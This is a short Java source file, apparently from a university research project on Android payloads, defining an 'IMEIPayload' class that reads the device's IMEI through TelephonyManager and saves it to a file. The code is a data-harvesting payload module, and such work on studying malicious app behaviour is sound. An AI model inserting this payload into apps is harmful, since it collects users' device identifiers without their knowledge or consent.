package it.unisannio.srss.ame.payloads.imei;

import it.unisannio.srss.ame.payloads.Payload;
import it.unisannio.srss.ame.payloads.common.PayloadUtils;
import it.unisannio.srss.ame.payloads.common.PayloadUtils.PrintResult;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

public class IMEIPayload implements Payload {

	private final static String TAG = IMEIPayload.class.getSimpleName();

	private final Context context;

	public IMEIPayload(Context context) {
		this.context = context;
	}

	@Override
	public void run() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		PrintResult res = PayloadUtils.printToFile(this.getClass(), imei);
		if (res == PrintResult.SUCCESS)
			Log.i(TAG, "IMEI saved successful");
		else
			Log.e(TAG, res.name());

	}
}
